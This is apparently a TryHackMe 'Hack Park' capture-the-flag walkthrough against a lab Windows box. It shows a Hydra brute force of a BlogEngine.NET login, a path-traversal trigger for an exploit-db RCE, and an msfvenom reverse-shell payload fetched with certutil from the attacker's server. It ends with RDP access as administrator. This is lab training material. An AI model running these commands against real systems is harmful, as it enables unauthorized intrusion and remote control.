# TryHackMe-Hack Park

>Abdullah Rizwan | 09 : 45 PM | 30th October 2020

## NMAP

This is a windows machine so it might not respond to ping so in this we are going to use `-Pn` to ingore ping the box
```
nmap -Pn -sC -sV 10.10.34.2

Host is up (0.17s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-10-30T16:52:20+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
## PORT 80

<img src="https://imgur.com/nOYC3rf.png"/>

I uploaded the image to see where this image was on the internet

<img src="https://imgur.com/WfgWFD7.png"/>

Then I came on to a page where it mentions the clown's name `pennywise`

<img src="https://imgur.com/J8mG2C8.png"/>

## Gobuster

<img src="https://imgur.com/KV2eaqt.png"/>

Here we see an `/admin` page lets visit it 

<img src="https://imgur.com/q2OCmr1.png"/>

We can on the source that this is `post` form which the request that will be made here will be post a request.

<img src="https://imgur.com/6KpPuR7.png"/>


## Hydra

Now that we know it's a `post` request login form let's try to bruteforce it with `hydra` but we want a username to bruteforce with so by looking at the hints provided by this room the username is `admin` .

Doing  this will give you wrong results 

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.34.2 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin:UserName=^USER^ & Password=^PASS^&Login:Login failed"`

<img src="https://imgur.com/UA1LzC1.png"/>

Now we launch `burpsuite` intercept the login page with the credentials and we will get this request

<img src="https://imgur.com/KG8z3Xx.png"/>

```
__VIEWSTATE=rKI96%2BsCmsHE%2BBnXdIfX2SDkfH9eXlljTdGkdGcVZvZs4wFTrEcHN8RzIiJUP3%2BmIotfzJsQcEGZkMsFWgCKCcodwrJ0SgoYW6AHLLU3Lf9eI4t0abp6pf2yQ6TIJhJb8D143UhfjmN83j2hEeECKoz5FknRAYWStUq%2FPQA%2FIuHRtaES66kLKksczFvJuU%2B5g5E0lZFLWKoiBU8kIHH%2FBJcfOZrMU4UiWe9lOS2zOwtICdeoD3%2FmgBKIVbefaQDASAS%2BEyufY0WmK%2FGQlKkKrKgw7aY5yjnjHK0qlnhWSlYirlOzmQG1OM%2BgjNLe9lh%2B0FnTKo%2B8l2yrE%2FOtmjfzo7GUHHDyy2kG3Jzb%2Fnc63sYdmpE3&__EVENTVALIDATION=TuS%2F6KtXDbAW7T9F99qLDc%2Bdn5DVR%2FFt6iHlpBIA70gHcfSj6gOvo%2BedBax4e%2Bg9AHpwy0wZr9UAz18%2FzK7qGWGOt3Qa3y0kYnv7So%2BCr7Dx%2F2hgHXmU8QEl1nZbLT%2B9X%2FYLOQfNLu6V2SMGWewSmvdqTs%2FIbIHGLoXPTljXEiu4yPSy&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```
Modify the command by replacing `%21admin:` with `/admin:` and Username=admin with `^USER^` , Password=`^PASS^`

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.34.2 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=rKI96%2BsCmsHE%2BBnXdIfX2SDkfH9eXlljTdGkdGcVZvZs4wFTrEcHN8RzIiJUP3%2BmIotfzJsQcEGZkMsFWgCKCcodwrJ0SgoYW6AHLLU3Lf9eI4t0abp6pf2yQ6TIJhJb8D143UhfjmN83j2hEeECKoz5FknRAYWStUq%2FPQA%2FIuHRtaES66kLKksczFvJuU%2B5g5E0lZFLWKoiBU8kIHH%2FBJcfOZrMU4UiWe9lOS2zOwtICdeoD3%2FmgBKIVbefaQDASAS%2BEyufY0WmK%2FGQlKkKrKgw7aY5yjnjHK0qlnhWSlYirlOzmQG1OM%2BgjNLe9lh%2B0FnTKo%2B8l2yrE%2FOtmjfzo7GUHHDyy2kG3Jzb%2Fnc63sYdmpE3&__EVENTVALIDATION=TuS%2F6KtXDbAW7T9F99qLDc%2Bdn5DVR%2FFt6iHlpBIA70gHcfSj6gOvo%2BedBax4e%2Bg9AHpwy0wZr9UAz18%2FzK7qGWGOt3Qa3y0kYnv7So%2BCr7Dx%2F2hgHXmU8QEl1nZbLT%2B9X%2FYLOQfNLu6V2SMGWewSmvdqTs%2FIbIHGLoXPTljXEiu4yPSy&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -V

```


<img src="https://imgur.com/113BURI.png"/>

Now give it some time while it's ruuning 

<img src="https://imgur.com/rCaj2oT.png"/>

And you will have your username : `admin` and password : `1qaz2wsx`

<img src="https://imgur.com/IkZtMrd.png"/> 

<img src="https://imgur.com/hqhpTq4.png"/>

You can see here that it is using `blogengine.net` and it's version is `3.3.6`. So first thing that I'am going to do is search for this on `exploit-db`

https://www.exploit-db.com/exploits/46353

<img src="https://imgur.com/r9FFuln.png"/>


Now edit your IP and port in this code 

<img scr="https://imgur.com/yjZfCJX.png"/>

Save it as `PostView.ascx` 

<img src="https://imgur.com/x8qIvhG.png"/>


Go to `Posts` on the blogenginge

<img src="https://imgur.com/bvCHx6j.png"/>


<img src="https://imgur.com/2ZW9WAF.png"/>


<img src="https://imgur.com/7I2LHIJ.png"/>

Set up your `netcat` listener

Navigate to `http://10.10.34.2/?theme=../../App_Data/files`

<img src="https://imgur.com/DS7kjLU.png"/>


<img src="https://imgur.com/6dCUcb9.png"/>


Now this shell is unstable so we are going to upload a payload and capture it using `metasploit`

## Msfvenom

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.14.3.143  LPORT=5555 -f exe > shell.exe
```

<img src="https://imgur.com/DJUbGfB.png">

## Metasploit

Launch metasploit through `msfconsole -q` 

`use exploit/multi/handler ` for listener

<img src="https://imgur.com/4yX4MSe.png"/>

Set the options as same as on the payload

<img src="https://imgur.com/e9sZ8t6.png"/>

Now upload it to the reverse shell

`python3 -m http.server 80`  For uploading 

`certutil.exe -urlcache -f http://10.14.3.143:80/shell.exe shell.exe` For donwloading through reverse shell


<img src="https://imgur.com/WgDH07u.png"/>

And looks we have it on the windows box

<img src="https://imgur.com/6cw5ojF.png"/>

And just like that we have a stabilized reverse shell through metasploit ,awesome !

<img src="https://imgur.com/n02ykTg.png"/>

You can run `systeminfo` on cmd

```
systeminfo                                                                
                                                                          
Host Name:                 HACKPARK                                       
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User   
Registered Organization:                                                  
Product ID:                00252-70000-00000-AA886    
Original Install Date:     8/3/2019, 10:43:23 AM            
System Boot Time:          10/30/2020, 9:44:53 AM    
System Manufacturer:       Xen                                            
System Model:              HVM domU                                       
System Type:               x64-based PC          
Processor(s):              1 Processor(s) Installed.           
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2400 Mhz                   
BIOS Version:              Xen 4.2.amazon, 8/24/2006
Windows Directory:         C:\Windows  

``` 
Here you can find `Orginal Install Date`

For some reason the abonormal service part was giving me issues so I skipped doing the whole `message.exe` thing instead I found something interesting with winpeas that there are autologon credentials for the administrator , We know that RDP on port 3389 is open so we can use `remmina` and get in to the box 

<img src="https://imgur.com/gwmLIi0.png"/>

Now we are administrator and can do pretty much anythin.